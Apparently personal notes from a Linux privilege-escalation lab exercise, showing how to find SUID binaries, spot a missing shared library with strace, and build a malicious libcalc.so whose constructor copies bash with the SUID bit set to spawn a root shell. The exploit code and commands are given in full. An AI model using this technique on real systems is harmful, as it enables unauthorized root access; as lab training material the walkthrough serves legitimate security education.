**Detection**

Linux VM

1. In command prompt type: 
   
```
find / -type f -perm -04000 -ls 2>/dev/null
```

![[Pasted image 20240601220458.png]]

2. From the output, make note of all the SUID binaries.

3. In command line type:

```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

![[Pasted image 20240601220752.png]]


4. From the output, notice that a .so file is missing from a writable directory.

**Exploitation**

Linux VM

1. In command prompt type: 
   
```
mkdir /home/user/.config
```

2. In command prompt type: 
   
```
cd /home/user/.config
```

3. Open a text editor and type:

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

  

8. Save the file as 
   
```
libcalc.c
```

9. In command prompt type:

```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

10. In command prompt type: 
    
```
/usr/local/bin/suid-so
```

11. In command prompt type: 
    
```
id
```

![[Pasted image 20240601221022.png]]


Answer the questions below

Click 'Completed' once you have successfully elevated the machine
